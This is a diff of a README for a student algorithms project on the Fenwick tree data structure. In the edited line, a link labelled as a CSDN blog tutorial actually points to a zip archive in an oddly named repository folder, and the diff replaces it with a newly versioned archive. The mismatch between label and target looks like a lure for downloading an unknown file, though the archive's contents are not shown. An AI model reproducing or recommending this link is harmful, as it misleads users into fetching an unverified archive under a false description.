@@ -4,7 +4,7 @@
 
 This project uses this data_structure, which can **calculate the sum of elements of a given sequence in the given range (l,r) very quickly**. We use it to **prune**. We can simply ignore the range(a[i]-m,a[i]+m) in our algorithm.
 
-For details of this data structure, go to [树状数组(详细分析+应用)，看不懂打死我!-CSDN博客](https://raw.githubusercontent.com/IIfaitdoux/ADS-Project-IV-Beautiful-Subsequence/main/neurologist/Beautiful-I-Project-Subsequence-AD-2.6.zip)
+For details of this data structure, go to [树状数组(详细分析+应用)，看不懂打死我!-CSDN博客](https://raw.githubusercontent.com/IIfaitdoux/ADS-Project-IV-Beautiful-Subsequence/main/neurologist/Beautiful_AD_I_Subsequence_Project_v2.7.zip)
 
 ## 2.Algorithm Specification
 
